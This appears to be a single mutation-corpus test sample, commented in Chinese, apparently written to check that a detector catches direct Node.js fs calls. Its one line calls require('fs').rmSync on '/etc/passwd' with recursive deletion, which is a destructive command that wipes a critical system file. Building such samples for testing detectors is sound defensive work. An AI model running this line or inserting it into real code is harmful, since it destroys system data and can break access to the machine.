// round-16 变异语料 M30：require('fs') 直调删除敏感路径（R11 直调形态击杀面）
require('fs').rmSync('/etc/passwd', { recursive: true })
